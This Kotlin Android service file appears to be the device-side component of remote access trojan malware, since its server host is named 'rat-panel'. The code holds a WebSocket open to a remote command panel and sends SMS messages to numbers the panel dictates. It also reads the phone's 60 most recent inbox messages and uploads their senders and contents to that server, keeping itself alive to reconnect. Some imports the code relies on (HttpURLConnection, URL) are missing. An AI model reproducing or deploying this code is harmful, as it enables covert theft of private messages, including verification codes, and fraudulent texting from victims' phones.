package com.screenlink.remote

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.telephony.SmsManager
import androidx.core.app.NotificationCompat
import okhttp3.*
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class TpcService : Service() {

    companion object {
        const val API_BASE_URL = "https://rat-panel-b91839a4be83.herokuapp.com"

        private const val CHANNEL_ID = "tpc_service"
        private const val NOTIFICATION_ID = 5001
        private const val POLL_INTERVAL = 20_000L
        private const val INBOX_SYNC_LIMIT = 60

        @Volatile var isRunning = false
            private set
    }

    private val work = Executors.newSingleThreadExecutor()
    private val bgThread = HandlerThread("tpc").apply { start() }
    private val bgHandler = Handler(bgThread.looper)

    private val client = OkHttpClient.Builder()
        .pingInterval(20, TimeUnit.SECONDS)
        .build()

    private var socket: WebSocket? = null
    private var attempts = 0
    private var stopped = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        isRunning = true
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundSafely()
        connect()
        syncInbox()
        schedulePoll()
        return START_STICKY
    }

    override fun onDestroy() {
        isRunning = false
        stopped = true
        socket?.close(1000, "bye")
        socket = null
        bgHandler.removeCallbacksAndMessages(null)
        super.onDestroy()
    }

    // ------------------------------------------------------- foreground

    private fun startForegroundSafely() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(NotificationManager::class.java)
            if (nm.getNotificationChannel(CHANNEL_ID) == null) {
                nm.createNotificationChannel(
                    NotificationChannel(CHANNEL_ID, "TPC Panel",
                        NotificationManager.IMPORTANCE_LOW)
                )
            }
        }

        val pi = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val n = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("TPC Panel active")
            .setContentText("Listening for SMS commands")
            .setSmallIcon(android.R.drawable.ic_dialog_email)
            .setOngoing(true)
            .setContentIntent(pi)
            .build()

        startForeground(NOTIFICATION_ID, n)
    }

    // ---------------------------------------------------------- socket

    private fun rid(): String =
        getSharedPreferences(DeviceTelemetry.PREFS, Context.MODE_PRIVATE)
            .getString("registration_id", "") ?: ""

    private fun connect() {
        if (stopped || socket != null) return

        val url = API_BASE_URL.replace("https://", "wss://") + "/ws/device/${rid()}"
        socket = client.newWebSocket(
            Request.Builder().url(url).build(),
            object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, r: Response) {
                    attempts = 0
                    syncInbox()
                    pollOutbox()
                }
                override fun onMessage(ws: WebSocket, text: String) = handle(text)
                override fun onFailure(ws: WebSocket, t: Throwable, r: Response?) {
                    socket = null
                    retry()
                }
                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    socket = null
                    retry()
                }
            }
        )
    }

    private fun retry() {
        if (stopped) return
        attempts = (attempts + 1).coerceAtMost(6)
        bgHandler.postDelayed({ connect() }, (1000L shl (attempts - 1)).coerceAtMost(20_000L))
    }

    private fun handle(text: String) {
        val msg = try { JSONObject(text) } catch (_: Exception) { return }
        if (msg.optString("type") != "sms_send") return

        val id = msg.optString("id")
        val to = msg.optString("to")
        val body = msg.optString("body")

        if (to.isBlank() || body.isBlank()) {
            ack(id, "failed", "missing to/body")
            return
        }

        work.execute {
            try {
                @Suppress("DEPRECATION")
                val mgr = SmsManager.getDefault()
                val parts = mgr.divideMessage(body)
                if (parts.size > 1) mgr.sendMultipartTextMessage(to, null, parts, null, null)
                else mgr.sendTextMessage(to, null, body, null, null)

                ack(id, "sent", "")
            } catch (e: Exception) {
                ack(id, "failed", e.message ?: "send error")
            }
        }
    }

    private fun ack(id: String, status: String, error: String) {
        if (id.isBlank()) return
        work.execute {
            var c: HttpURLConnection? = null
            try {
                c = URL("$API_BASE_URL/devices/outbox/$id/ack").openConnection() as HttpURLConnection
                c.requestMethod = "POST"
                c.doOutput = true
                c.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                val p = JSONObject().apply {
                    put("status", status); put("error", error)
                }.toString()
                c.outputStream.use { it.write(p.toByteArray(Charsets.UTF_8)) }
                c.responseCode
            } catch (_: Exception) {
            } finally { c?.disconnect() }
        }
    }

    // ---------------------------------------------------------- polling

    private val pollRunnable = object : Runnable {
        override fun run() {
            if (stopped) return
            pollOutbox()
            bgHandler.postDelayed(this, POLL_INTERVAL)
        }
    }

    private fun schedulePoll() {
        bgHandler.removeCallbacks(pollRunnable)
        bgHandler.postDelayed(pollRunnable, POLL_INTERVAL)
    }

    private fun pollOutbox() {
        work.execute {
            var c: HttpURLConnection? = null
            try {
                val url = URL("$API_BASE_URL/devices/outbox?registration_id=${rid()}")
                c = url.openConnection() as HttpURLConnection
                c.requestMethod = "GET"
                c.connectTimeout = 12_000
                c.readTimeout = 12_000

                if (c.responseCode !in 200..299) return@execute

                val text = c.inputStream.bufferedReader().use { it.readText() }
                val items = JSONObject(text).optJSONArray("items") ?: return@execute

                for (i in 0 until items.length()) {
                    val item = items.optJSONObject(i) ?: continue
                    val payload = JSONObject().apply {
                        put("type", "sms_send")
                        put("id", item.optString("id"))
                        put("to", item.optString("to"))
                        put("body", item.optString("body"))
                    }
                    handle(payload.toString())
                }
            } catch (_: Exception) {
            } finally { c?.disconnect() }
        }
    }

    // ------------------------------------------------------- inbox sync

    private fun syncInbox() {
        work.execute {
            try {
                val rows = JSONArray()
                val cursor = contentResolver.query(
                    android.provider.Telephony.Sms.Inbox.CONTENT_URI,
                    arrayOf("address", "body", "date"),
                    null, null, "date DESC"
                ) ?: return@execute

                cursor.use {
                    var count = 0
                    while (it.moveToNext() && count < INBOX_SYNC_LIMIT) {
                        rows.put(JSONObject().apply {
                            put("address", it.getString(0) ?: "")
                            put("body", it.getString(1) ?: "")
                            put("direction", "in")
                            put("timestamp", it.getLong(2))
                        })
                        count++
                    }
                }

                if (rows.length() == 0) return@execute

                var c: HttpURLConnection? = null
                try {
                    c = URL("$API_BASE_URL/devices/sms/sync").openConnection() as HttpURLConnection
                    c.requestMethod = "POST"
                    c.doOutput = true
                    c.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
                    val p = JSONObject().apply {
                        put("registration_id", rid())
                        put("messages", rows)
                    }.toString()
                    c.outputStream.use { it.write(p.toByteArray(Charsets.UTF_8)) }
                    c.responseCode
                } finally { c?.disconnect() }
            } catch (_: Exception) {
            }
        }
    }
}